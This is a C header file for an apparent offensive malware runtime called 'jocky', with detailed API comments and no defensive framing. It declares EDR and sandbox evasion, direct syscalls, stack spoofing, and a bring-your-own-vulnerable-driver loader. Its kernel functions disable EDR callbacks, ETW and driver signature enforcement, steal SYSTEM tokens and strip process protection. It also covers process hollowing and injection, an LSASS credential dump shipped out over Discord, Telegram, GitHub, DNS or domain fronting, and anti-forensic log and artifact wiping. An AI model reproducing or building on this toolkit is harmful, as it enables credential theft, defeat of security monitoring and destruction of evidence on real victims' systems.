#ifndef JOCKY_RT_H
#define JOCKY_RT_H

#ifdef __cplusplus
extern "C" {
#endif

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

/* ============================================================================
 * Anti-Analysis: Debugger, VM, Sandbox Detection
 * ============================================================================ */

typedef enum {
    JOCKY_ANALYSIS_CLEAN = 0,
    JOCKY_ANALYSIS_DEBUGGER = 1 << 0,
    JOCKY_ANALYSIS_VM = 1 << 1,
    JOCKY_ANALYSIS_SANDBOX = 1 << 2,
} jocky_analysis_flags_t;

/* Function pointer type for obfuscation/deobfuscation helpers */
typedef void (*obfuscated_func_t)(void);

/* Run all anti-analysis checks. Returns bitmask of detected threats. */
uint32_t jocky_check_analysis_environment(void);

/* Individual checks */
bool jocky_is_debugger_present(void);
bool jocky_is_remote_debugger(void);
bool jocky_check_hardware_breakpoints(void);
bool jocky_is_vm(void);
bool jocky_is_sandbox(void);

/* Enhanced VM detection */
bool jocky_is_hyperv(void);
bool jocky_is_xen(void);
bool jocky_is_kvm(void);
bool jocky_is_vmware(void);
bool jocky_is_virtualbox(void);
bool jocky_is_qemu(void);

/* Enhanced sandbox detection */
bool jocky_detect_sandbox_filesystem(void);
bool jocky_detect_analysis_processes(void);
bool jocky_detect_analysis_environment(void);
bool jocky_detect_execution_tracing(void);

/* Timing checks */
bool jocky_check_timing_rdtsc(void);
bool jocky_check_timing_api(void);

/* Anti-disassembly techniques */
uintptr_t jocky_hide_function_entry(uintptr_t func_ptr);
void jocky_cross_function_obfuscate(void);
bool jocky_detect_disasm_hooks(void);
bool jocky_has_polymorphic_encoding(uint8_t* code_ptr, size_t len);
bool jocky_detect_cfg_hooks(void);
bool jocky_detect_static_analysis(void);
obfuscated_func_t jocky_obfuscate_function_ptr(obfuscated_func_t func);
obfuscated_func_t jocky_deobfuscate_function_ptr(obfuscated_func_t func);
bool jocky_detect_string_logging(void);
bool jocky_detect_frida_hooks(void);
void jocky_anti_disasm_init(void);

/* ============================================================================
 * Evasion: Unhooking, Syscalls, Stack Spoofing
 * ============================================================================ */

#ifdef _WIN32

/* ── ntdll unhooking ─────────────────────────────────────────────────── */

/* Reload a clean .text from System32\ntdll.dll, overwriting any inline
 * hooks placed by EDR/AV.  Uses NtProtectVirtualMemory directly to avoid
 * the hooked VirtualProtect.  Call before any sensitive ntdll-routed work. */
bool jocky_unhook_ntdll(void);

/* ── Direct syscalls: Hell's Gate + Halo's Gate ──────────────────────── */

/* Resolve SSN for a Zw* function name.
 * Hell's Gate: reads SSN from the unhooked stub directly.
 * Halo's Gate: if the stub is patched, scans adjacent Zw* exports in
 *              alphabetical (= SSN) order and infers the SSN by offset. */
uint32_t jocky_get_syscall_number(const char* zw_name);
uint32_t jocky_get_syscall_num   (const char* zw_name); /* alias */

/* Execute a direct syscall (up to 4 register args).
 * Allocates a one-shot RWX stub per call; does not call through ntdll. */
intptr_t jocky_direct_syscall (uint32_t ssn,
                                uintptr_t a1, uintptr_t a2,
                                uintptr_t a3, uintptr_t a4);
intptr_t jocky_direct_syscall4(uint32_t ssn,
                                uintptr_t a1, uintptr_t a2,
                                uintptr_t a3, uintptr_t a4); /* alias */

/* ── Stack / return-address spoofing ─────────────────────────────────── */

/* Find a RET gadget (0xC3) in ntdll.dll's .text section.
 * Prefers `ret; int3` (0xC3 0xCC) to avoid false-positive chains.
 * Result is cached on first call. */
PVOID jocky_find_ret_gadget(void);

/* Call fn(a1,a2,a3,a4) with the immediate return address replaced by a
 * RET gadget inside ntdll.dll.  During fn's execution the call stack shows:
 *   fn  ← ntdll!<ret gadget>  ← our real return addr (deeper)
 * Falls back to a direct call if no gadget is available. */
intptr_t jocky_spoof_call(PVOID fn,
                           uintptr_t a1, uintptr_t a2,
                           uintptr_t a3, uintptr_t a4);

/* Stack-spoofed direct syscall — combines jocky_spoof_call + jocky_direct_syscall.
 * The stack during the syscall shows a return addr inside ntdll.dll. */
intptr_t jocky_spoof_syscall(uint32_t ssn,
                              uintptr_t a1, uintptr_t a2,
                              uintptr_t a3, uintptr_t a4);

/* ── Nt* convenience wrappers ────────────────────────────────────────── */

typedef LONG NTSTATUS;

NTSTATUS jocky_nt_allocate_virtual_memory(HANDLE process, PVOID* base,
                                           ULONG_PTR zero_bits, PSIZE_T size,
                                           ULONG type, ULONG protect);
NTSTATUS jocky_nt_protect_virtual_memory (HANDLE process, PVOID* base,
                                           PSIZE_T size, ULONG new_protect,
                                           PULONG old_protect);
NTSTATUS jocky_nt_write_virtual_memory   (HANDLE process, PVOID base,
                                           PVOID buffer, SIZE_T size,
                                           PSIZE_T written);
NTSTATUS jocky_nt_create_thread          (HANDLE* handle, ACCESS_MASK access,
                                           POBJECT_ATTRIBUTES attrs,
                                           HANDLE process, PVOID start,
                                           PVOID arg, ULONG flags, PULONG tid);

#endif /* _WIN32 (evasion) */

/* ============================================================================
 * BYOVD Loader
 * ============================================================================ */

#ifdef _WIN32
#include <windows.h>

/* State returned by jocky_byovd_load; pass to jocky_byovd_unload. */
typedef struct {
    HANDLE device;               /* open device handle (INVALID_HANDLE_VALUE if no symlink) */
    char   driver_path[MAX_PATH];/* path of the dropped .sys on disk */
    char   service_name[64];     /* SCM service name used to register it */
} jocky_byovd_t;

/* Extract the driver from the .jdrv PE section, drop it to %TEMP%, create
 * a kernel service, start it, and open a handle to \\.\ device_name.
 *
 * service_name  – SCM service name (NULL = auto-generate "jky_<hex>")
 * device_name   – NT device symlink name without "\\.\", e.g. "MyDriver"
 *                 (NULL = same as service_name)
 * out           – filled on success; caller must call jocky_byovd_unload()
 *
 * Returns false if no .jdrv section exists or any step fails.
 * Requires SeLoadDriverPrivilege / Administrator. */
bool jocky_byovd_load(const char* service_name,
                      const char* device_name,
                      jocky_byovd_t* out);

/* Stop the service, delete it from SCM, and delete the dropped .sys file. */
void jocky_byovd_unload(jocky_byovd_t* ctx);

/* ── Driver Interaction ─────────────────────────────────────────────────
 *
 * Two complementary systems:
 *
 *  1. Static profile table  – knows RTCore64, WinRing0/x64, gdrv.
 *     Primitive wrappers (read_phys / write_phys / read_msr / write_msr)
 *     auto-detect the loaded driver from ctx->service_name and use the
 *     correct IOCTL+buffer layout.
 *
 *  2. Dynamic .jmani manifest  – embedded at build time by
 *     "jockyc --manifest <file>".  Exposes any IOCTL by name via
 *     jocky_driver_invoke().  Falls back to this when the driver is not
 *     in the static table.
 *
 * Both systems use the same jocky_byovd_t handle returned by jocky_byovd_load.
 * ─────────────────────────────────────────────────────────────────────── */

/* Parse the .jmani section and populate the manifest cache.
 * Called automatically at first jocky_driver_invoke(); only needed
 * manually if you want early failure detection. */
bool jocky_manifest_load(void);

/* Read <size> bytes of physical memory starting at phys_addr into out.
 * Supports: RTCore64, WinRing0, WinRing0x64.
 * Falls back to manifest primitive "read_phys" for unknown drivers. */
bool jocky_driver_read_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
                             void* out, uint32_t size);

/* Write <size> bytes from in to physical memory at phys_addr.
 * Supports: RTCore64, WinRing0, WinRing0x64. */
bool jocky_driver_write_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
                              const void* in, uint32_t size);

/* Read a model-specific register.
 * Supports: WinRing0, WinRing0x64. */
bool jocky_driver_read_msr(jocky_byovd_t* ctx, uint32_t msr_id,
                            uint64_t* out);

/* Write a model-specific register.
 * Supports: WinRing0, WinRing0x64. */
bool jocky_driver_write_msr(jocky_byovd_t* ctx, uint32_t msr_id,
                             uint64_t val);

/* Map a physical address range and return the kernel VA via gdrv.
 * out_va receives the kernel virtual address.
 * Supports: gdrv. */
bool jocky_driver_map_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
                            uint32_t size, uintptr_t* out_va);

/* Generic IOCTL dispatch via the .jmani manifest.
 * primitive  – must match a name in the embedded manifest exactly.
 * in_buf     – input buffer (may be NULL if in_size == 0).
 * in_size    – input buffer size in bytes.
 * out_buf    – output buffer (may be NULL if out_size == 0).
 * out_size   – output buffer size in bytes.
 * Returns false if the primitive name is not found or the IOCTL fails. */
bool jocky_driver_invoke(jocky_byovd_t* ctx, const char* primitive,
                         const void* in_buf,  uint32_t in_size,
                         void*       out_buf, uint32_t out_size);

#endif /* _WIN32 (BYOVD + driver interaction) */

/* ============================================================================
 * Kernel Exploitation Primitives  *(Windows only, requires BYOVD)*
 * ============================================================================ */

#ifdef _WIN32

/* ── Low-level kernel virtual R/W ───────────────────────────────────────
 * Built on top of jocky_driver_read/write_phys via 4-level page table walk.
 * Requires jocky_byovd_load() to have run first.
 * ctx->device must be valid; s_cr3 is lazily initialised on first call.    */
bool jocky_kread (jocky_byovd_t* ctx, uint64_t kva, void*       out, uint32_t size);
bool jocky_kwrite(jocky_byovd_t* ctx, uint64_t kva, const void* in,  uint32_t size);

/* ── Exploitation primitives ────────────────────────────────────────────
 * All of these call jocky_kread/jocky_kwrite internally.
 * Bootstrap: first call scans ≤ 1 GB physical memory for System EPROCESS
 * to obtain CR3.  Subsequent calls reuse the cached CR3.               */

/* Zero every active RoutineBlock* in PspCreateProcessNotifyRoutine,
 * PspCreateThreadNotifyRoutine, and PspLoadImageNotifyRoutine arrays.
 * Returns true if at least one callback was removed. */
bool jocky_disable_edr_callbacks(jocky_byovd_t* ctx);

/* Find and zero the EtwpEventEnabled flag referenced by EtwEventWrite.
 * Disables all kernel ETW write paths for this boot session. */
bool jocky_disable_etw(jocky_byovd_t* ctx);

/* Target the Microsoft-Windows-Threat-Intelligence ETW provider specifically.
 *
 * Two passes:
 *  A) Locate EtwTiLog* exports in ntoskrnl and zero their per-function enable
 *     flags via the same RIP-relative scan used by jocky_disable_etw().
 *  B) Scan ntoskrnl image for the TI provider GUID and zero the IsEnabled
 *     counter in the _ETW_GUID_ENTRY, disabling the provider at registration
 *     level regardless of which EtwTiLog* code path fires.
 *
 * Call this in addition to jocky_disable_etw() — they target different flags. */
bool jocky_disable_etw_ti(jocky_byovd_t* ctx);

/* Walk _OBJECT_TYPE.CallbackList for PsProcessType and PsThreadType, and
 * disable (Active=FALSE, PreOperation=NULL, PostOperation=NULL) every
 * registered ObRegisterCallbacks entry.
 *
 * EDR drivers use these object callbacks to intercept OpenProcess/OpenThread
 * and strip dangerous access rights (PROCESS_VM_READ, PROCESS_ALL_ACCESS).
 * This removes them independently of the Ps*Notify callback arrays targeted
 * by jocky_disable_edr_callbacks(). */
bool jocky_disable_ob_callbacks(jocky_byovd_t* ctx);

/* Zero EPROCESS.Protection for the given PID, removing PPL/PP shielding.
 * After this call, the process can be opened with any desired access. */
bool jocky_strip_ppl(jocky_byovd_t* ctx, uint32_t pid);

/* Replace the primary token of target_pid with the SYSTEM process token,
 * granting SYSTEM-level privileges to the target process. */
bool jocky_elevate_token(jocky_byovd_t* ctx, uint32_t target_pid);

/* Strip SeDebug, SeTcb, and SeLoadDriver from target_pid's token bitmasks,
 * reducing an over-privileged process. */
bool jocky_downgrade_token(jocky_byovd_t* ctx, uint32_t target_pid);

/* Set g_CiOptions in ci.dll to 0, disabling Driver Signature Enforcement.
 * !! PatchGuard monitors this value – call only in a PG-suppressed window. !!
 * Original value is cached; call jocky_restore_dse() before unloading. */
bool jocky_disable_dse(jocky_byovd_t* ctx);

/* Restore g_CiOptions to the value captured by jocky_disable_dse().
 * No-op if jocky_disable_dse() was never called. */
bool jocky_restore_dse(jocky_byovd_t* ctx);

/* Load an unsigned kernel driver within a timed, PatchGuard-safe DSE window.
 *
 * Orchestrates the full sequence atomically:
 *   [pre-window]
 *     1. Enable SeLoadDriverPrivilege on the current token
 *     2. Register a kernel-driver SCM service entry for driver_path
 *        (done BEFORE patching — no slow SCM RPC inside the timed region)
 *   [DSE window  ←  target < 500 ms, always exits in ≤ 2 s]
 *     3. jocky_disable_dse(ctx)        → CI!g_CiOptions = 0
 *     4. NtLoadDriver(registry_path)   → direct NTAPI call, no SCM
 *     5. jocky_restore_dse(ctx)        → CI!g_CiOptions = original
 *        (unconditional — runs even on NtLoadDriver error)
 *   [post-window]
 *     6. Delete the SCM service entry
 *     7. Return true iff NtLoadDriver succeeded
 *
 * PatchGuard re-verifies g_CiOptions on a timer (~5-10 min retail).
 * By restoring unconditionally and immediately, the patch window stays
 * well below the detection threshold.
 *
 * driver_path  — absolute wide path to the unsigned .sys file
 * service_name — SCM service name (NULL → auto-generated "jky_<hash>")
 *
 * Requires: active jocky_byovd_t ctx + SeLoadDriverPrivilege / SYSTEM. */
bool jocky_dse_load_driver(jocky_byovd_t* ctx,
                            const wchar_t* driver_path,
                            const char*    service_name);

#endif /* _WIN32 (kernel exploitation) */

/* ============================================================================
 * Execution: In-Memory Techniques  *(Windows only)*
 * ============================================================================ */

#ifdef _WIN32

/* Process hollowing — create target_path suspended, replace its image with
 * payload, fix the entry point in the thread context, resume. */
bool jocky_process_hollow(const wchar_t* target_path,
                          const uint8_t* payload,
                          size_t payload_size);

/* Module stomping — find module_name in pid's loaded-module list, make its
 * region RWX, overwrite with payload (headers + sections), execute at EP. */
bool jocky_module_stomp(uint32_t pid,
                        const wchar_t* module_name,
                        const uint8_t* payload,
                        size_t payload_size);

/* Reflective DLL injection — write dll_bytes to RWX memory in pid, then
 * CreateRemoteThread at the "ReflectiveLoader" export inside the DLL.
 * Returns false if the DLL has no "ReflectiveLoader" export. */
bool jocky_rdll_inject(uint32_t pid,
                       const uint8_t* dll_bytes,
                       size_t dll_size);

/* Process parameter poisoning (P³) — overwrite PEB.RTL_USER_PROCESS_PARAMETERS
 * CommandLine and/or ImagePathName in the target process.  Pass NULL for any
 * field you don't want to change. */
bool jocky_p3_poison(uint32_t pid,
                     const wchar_t* fake_cmdline,
                     const wchar_t* fake_image_path);

/* Thread execution hijacking — find a thread in pid, suspend it, inject
 * shellcode into an RWX allocation, redirect the thread's RIP to it, resume. */
bool jocky_thread_hijack(uint32_t pid,
                          const uint8_t* shellcode,
                          size_t shellcode_size);

#endif /* _WIN32 (execution) */

/* ============================================================================
 * Exfiltration  *(Windows only)*
 * ============================================================================ */

#ifdef _WIN32

/* Encrypt data for transmission.
 * Generates a random 16-byte RC4 session key, prepends it to out, and
 * RC4-encrypts data into out+16.  out must be at least data_len + 16 bytes. */
bool jocky_exfil_encrypt(const uint8_t* data, size_t data_len,
                          uint8_t* out, size_t* out_len);

/* Domain fronting — HTTPS POST to front_host (CDN SNI) with Host: real_host.
 * Certificate CN validation is relaxed; traffic still travels encrypted to
 * the CDN edge node before being forwarded to the real backend. */
bool jocky_exfil_front(const char* front_host, const char* real_host,
                        const char* path,
                        const uint8_t* data, size_t data_len);

/* DNS tunneling — encode data as base32-labeled A-record queries against
 * c2_domain.  The authoritative resolver for that domain logs all queries.
 * Format: <4-hex-seq>.<16-char-b32-chunk>.<c2_domain>
 * Terminates with a FFFF.END.<c2_domain> sentinel query. */
bool jocky_exfil_dns(const char* c2_domain,
                      const uint8_t* data, size_t data_len);

/* Discord webhook — POST base64(data) as message content.
 * webhook_url is the full URL including token.
 * Chunks at 1 500 bytes to stay within Discord's 2 000-char limit. */
bool jocky_exfil_discord(const char* webhook_url,
                          const uint8_t* data, size_t data_len);

/* Telegram Bot API — POST base64(data) as sendMessage text.
 * Chunks at 3 000 bytes (Telegram's 4 096-char limit). */
bool jocky_exfil_telegram(const char* bot_token, const char* chat_id,
                           const uint8_t* data, size_t data_len);

/* GitHub Gist — PATCH a Gist file named "d.txt" with base64(data).
 * token must have the gist scope. */
bool jocky_exfil_github(const char* token, const char* gist_id,
                         const uint8_t* data, size_t data_len);

/* ── LSASS credential dump ─────────────────────────────────────────────── */

/* Find LSASS's PID by walking the process list via NtQuerySystemInformation.
 * Never calls OpenProcess on LSASS.  Returns 0 on failure. */
uint32_t jocky_lsass_pid(void);

/* Dump LSASS memory using WerFaultSecure.exe (Microsoft-signed PPL process).
 *
 * Spawns WerFaultSecure with:
 *   -u -p <lsass_pid> -ip <our_pid> -s 524288 /type 2
 * waits for it to write %LOCALAPPDATA%\CrashDumps\lsass.exe.<pid>.dmp,
 * reads the dump into *out_buf, deletes the file, and returns.
 *
 * Our process never opens a handle to LSASS; Defender sees the trusted
 * WerFaultSecure binary performing the dump, not us.
 *
 * *out_buf must be freed by the caller with jocky_free().
 * Requires SeDebugPrivilege or SYSTEM. */
bool jocky_lsass_dump_werfault(uint8_t** out_buf, size_t* out_size);

/* Convenience: dump LSASS, RC4-encrypt the result (16-byte prepended key),
 * and ship via the specified exfil channel.
 *
 * exfil_url  — channel endpoint (webhook URL / "token:chat_id" / gist /
 *              DNS zone / HTTP URL — depends on exfil_type)
 * exfil_type — one of: "discord" | "telegram" | "github" | "dns" | "http"
 *
 * Returns true only if the dump was obtained and successfully transmitted. */
bool jocky_lsass_exfil(const char* exfil_url, const char* exfil_type);

#endif /* _WIN32 (exfiltration) */

/* ============================================================================
 * Cleanup: Anti-Forensics  *(Windows unless noted)*
 * ============================================================================ */

/* Delete the running executable using POSIX-semantics unlink (Win10+),
 * rename+delete-on-close (Win7+), or MoveFileEx reboot-delete as fallbacks.
 * Linux: unlinks /proc/self/exe immediately. */
bool jocky_self_delete(void);

/* Clear every Windows event log channel via EvtClearLog (all channels
 * including Sysmon, PowerShell, WMI-Activity).  Also clears legacy logs via
 * ClearEventLog.  Linux: journalctl vacuum + wtmp/lastlog truncate. */
bool jocky_clear_logs(void);

/* Delete Prefetch .pf files, Recent shortcuts, and %TEMP% contents.
 * Uses Win32 file APIs — no child processes spawned. */
bool jocky_wipe_artifacts(void);

/* Delete all .pf files from %SystemRoot%\Prefetch. */
bool jocky_wipe_prefetch(void);

/* Delete the AppCompatCache registry value and flush the in-memory ShimCache
 * via the undocumented BaseFlushAppcompatCache() kernel32 export. */
bool jocky_patch_shimcache(void);

/* Load Amcache.hve as a temporary registry hive (requires SeBackupPrivilege
 * + SeRestorePrivilege), delete all entries whose path matches the current
 * executable, then unload the hive. */
bool jocky_patch_amcache(void);

/* Stop the SRUM service (svsvc), delete SRUDB.dat so Windows recreates it
 * empty, then restart the service.  Schedules deletion on next boot if the
 * file cannot be deleted immediately. */
bool jocky_clear_srum(void);

/* Run all cleanup steps in order: clear logs → wipe prefetch → patch ShimCache
 * → patch Amcache → clear SRUM → wipe artifacts → self-delete. */
bool jocky_cleanup_all(void);

/* ============================================================================
 * Memory Allocators
 * ============================================================================ */

/* Allocate a zero-initialized buffer of size bytes.
 * Windows: HeapAlloc(HEAP_ZERO_MEMORY).  Linux: calloc.
 * Returns NULL on failure or if size <= 0. */
void* jocky_alloc(int64_t size);

/* Safe allocation with error code return. Sets *out on success. */
int32_t jocky_alloc_safe(int64_t size, void **out);

/* Free a buffer previously returned by jocky_alloc. No-op on NULL. */
void  jocky_free(void* ptr);

#ifdef _WIN32
/* Allocate a zeroed jocky_byovd_t context (opaque pointer; use with
 * jocky_byovd_load / jocky_byovd_unload / jocky_byovd_destroy). */
void* jocky_byovd_new(void);

/* Call jocky_byovd_unload() and then free the context. Safe on NULL. */
void  jocky_byovd_destroy(void* ctx);
#endif

/* ============================================================================
 * Crypto: String / Data Decryption
 * ============================================================================ */

/* Simple XOR decrypt in-place. Key rotates per byte. */
void jocky_decrypt_xor(uint8_t* data, size_t len, uint8_t key);

/* Safe XOR decrypt with validation - returns error code */
int32_t jocky_decrypt_xor_safe(uint8_t* data, size_t len, uint8_t key);

/* RC4-based stream decrypt */
void jocky_decrypt_rc4(uint8_t* data, size_t len, const uint8_t* key, size_t key_len);

/* Safe RC4 decrypt with validation - returns error code */
int32_t jocky_decrypt_rc4_safe(uint8_t* data, size_t len, const uint8_t* key, size_t key_len);

/* ============================================================================
 * Integrity Verification
 * ============================================================================ */

/* Verify the on-disk binary against the .jtamp checksum embedded by the
 * packer.  Calls ExitProcess(0xDEAD1337) on mismatch.  Returns true if the
 * check passed or if .jtamp was not found (unpacked build).
 * Windows only; always returns true on other platforms.
 */
bool jocky_verify_integrity(void);

/* ============================================================================
 * Initialization
 * ============================================================================ */

/* Full runtime initialization sequence:
 *  1. Integrity check  (abort if binary was patched)
 *  2. Anti-analysis checks
 *  3. Return threat bitmask (0 = clean)
 */
uint32_t jocky_runtime_init(void);

/* ============================================================================
 * Module Loading (Linux .so / Windows .dll dynamic loading)
 * ============================================================================ */

/* Load a shared library at runtime.
 * On Linux: uses dlopen(path, RTLD_LAZY | RTLD_LOCAL)
 * On Windows: uses LoadLibraryA
 * Returns opaque module handle, NULL on failure
 */
void* jocky_module_load(const char* path);

/* Unload a previously loaded module.
 * Returns true on success, false on failure
 */
bool jocky_module_unload(void* handle);

/* Resolve a symbol (function/variable) from a loaded module.
 * Returns pointer to the symbol, NULL if not found
 */
void* jocky_module_symbol(void* handle, const char* symbol_name);

/* Load a module and get a symbol in one call.
 * Convenience function combining jocky_module_load + jocky_module_symbol
 * Module remains loaded - caller should jocky_module_unload when done
 */
void* jocky_module_get_symbol(const char* path, const char* symbol_name);

/* Check if a symbol exists in a loaded module.
 * Useful for feature detection without resolving
 * Returns true if symbol exists, false otherwise
 */
bool jocky_module_has_symbol(void* handle, const char* symbol_name);

/* Get the base address of a loaded module (Linux only).
 * Parses /proc/self/maps to find the module's memory mapping.
 * Useful for calculating offsets from module base.
 * Returns base address, or 0 if not found/not loaded
 */
uintptr_t jocky_module_base(const char* path);

/* ============================================================================
 * Kernel Exploitation Primitives (Linux only)
 * ============================================================================ */

/* Read from kernel memory via /proc/kcore
 * Requires: root or specific kernel configurations
 * Returns: bytes read, 0 on failure
 */
size_t jocky_kread(uint64_t kva, void* buf, size_t size);

/* Write to kernel memory via /proc/kcore
 * Requires: root and writable /proc/kcore
 * Returns: bytes written, 0 on failure
 */
size_t jocky_kwrite(uint64_t kva, const void* data, size_t size);

/* Find kernel symbol address from /proc/kallsyms or /proc/modules
 * Returns: kernel address of symbol, 0 if not found
 */
uint64_t jocky_ksym(const char* symbol_name);

/* Disable SELinux enforcement
 * Writes 0 to /sys/fs/selinux/enforce
 * Requires: root or CAP_SYS_ADMIN
 */
bool jocky_disable_selinux(void);

/* Check SMEP (Supervisor Mode Execution Protection) status
 * Returns: 1 if enabled, 0 if disabled, -1 on error
 */
int jocky_smep_status(void);

/* Check SMAP (Supervisor Mode Access Prevention) status
 * Returns: 1 if enabled, 0 if disabled, -1 on error
 */
int jocky_smap_status(void);

/* Check KPTI (Kernel Page Table Isolation) status
 * Returns: 1 if enabled, 0 if disabled, -1 on error
 */
int jocky_kpti_status(void);

/* Attempt privilege escalation via kernel memory write
 * Modifies task_struct.cred to grant root privileges
 * Requires: kernel memory write capability and kernel address
 */
bool jocky_escalate_privs_kwrite(void);

/* ============================================================================
 * Process Hollowing (Linux only, requires ptrace capability)
 * ============================================================================ */

/* Hollow out a running process and replace with payload via ptrace.
 * Attaches to the target, writes payload to memory, redirects RIP.
 * Requires: same UID or CAP_SYS_PTRACE
 * Returns true on success, false on failure
 */
bool jocky_process_hollow_linux(uint32_t pid, const void* payload, uint64_t payload_size);

/* Spawn a process from scratch and hollow it before it runs main().
 * Forks target_path, stops it at entry point, injects payload, resumes.
 * Requires: CAP_SYS_PTRACE
 * Returns PID of hollowed process, -1 on failure
 */
uint32_t jocky_spawn_hollow_linux(const char* target_path, const void* payload, uint64_t payload_size);

/* ============================================================================
 * Polymorphic Obfuscation: Runtime Mutation and Randomization
 * ============================================================================ */

/* Core polymorphic mutation API - see mutation.h for full documentation */
typedef void (*mutation_pass_fn)(uint8_t *code, size_t len);

typedef struct {
    const char *name;
    mutation_pass_fn apply;
    int priority;
    int weight;
} MutationPass;

typedef struct {
    MutationPass *passes;
    int pass_count;
    uint32_t seed;
    int intensity;
} MutationEngine;

typedef struct {
    uintptr_t start;
    uintptr_t end;
    uintptr_t fallthrough;
} BasicBlock;

typedef struct {
    uintptr_t address;
    uint8_t *mutation_payload;
    size_t payload_len;
    int mutation_count;
    uint32_t checksum;
} SelfModifyingSegment;

typedef struct {
    uint32_t mutations_applied;
    uint32_t instructions_modified;
    uint32_t blocks_reordered;
    uint32_t self_modifications;
    uint64_t total_cycles;
} MutationStats;

/* Initialize mutation engine with optional seed and intensity (1-5) */
void jocky_mutation_init(MutationEngine *engine, uint32_t seed, int intensity);

/* Apply random polymorphic mutations to code buffer */
void jocky_apply_polymorphic_mutations(uint8_t *code, size_t len);

/* Apply mutations with specific intensity level */
void jocky_apply_mutations_intensity(uint8_t *code, size_t len, int intensity);

/* Randomization utilities */
void jocky_seed_rng(uint32_t seed);
uint32_t jocky_random_u32(void);
uint64_t jocky_random_u64(void);
uint32_t jocky_random_range(uint32_t min, uint32_t max);
void jocky_shuffle_array(void *array, size_t count, size_t elem_size);

/* Instruction-level mutations */
void jocky_mutate_instructions(uint8_t *code, size_t len);
void jocky_mutate_constants(uint8_t *code, size_t len);
void jocky_inject_junk_code(uint8_t *code, size_t len);
void jocky_mutate_bitwise_ops(uint8_t *code, size_t len);
void jocky_mutate_data_values(uint8_t *code, size_t len);

/* Control flow mutations */
BasicBlock *jocky_extract_basic_blocks(uint8_t *code, size_t len, int *out_count);
void jocky_randomize_cfg(uint8_t *code, size_t len);
void jocky_create_polymorphic_dispatch(uint8_t *code, size_t len);
void jocky_randomize_switch_cases(uint8_t *code, size_t len);

/* Self-modifying code */
void jocky_enable_code_mutation(uintptr_t code_addr, size_t code_len);
void jocky_apply_self_mutations(SelfModifyingSegment *segment);
void jocky_enable_periodic_mutation(int interval_seconds);
uint32_t jocky_compute_code_checksum(uint8_t *code, size_t len);
bool jocky_verify_code_integrity(SelfModifyingSegment *segment);

/* Mutation statistics and control */
MutationStats jocky_get_mutation_stats(void);
void jocky_reset_mutation_stats(void);
void jocky_set_mutation_enabled(bool enabled);
bool jocky_is_mutation_enabled(void);
void jocky_reshuffle_mutations(void);

#ifdef __cplusplus
}
#endif

#endif /* JOCKY_RT_H */
